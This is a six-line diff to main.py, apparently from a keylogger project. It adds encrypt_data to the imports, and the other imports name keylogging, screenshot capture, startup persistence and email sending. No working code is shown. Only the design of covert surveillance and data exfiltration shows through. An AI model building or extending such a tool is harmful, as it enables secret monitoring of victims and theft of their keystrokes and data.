@@ -1,6 +1,6 @@
 # main.py
 from logger import start_keylogger
-from encryption import generate_key
+from encryption import generate_key, encrypt_data
 from screenshot import start_screenshot_thread
 from persistence import add_to_startup
 from emailer import send_email
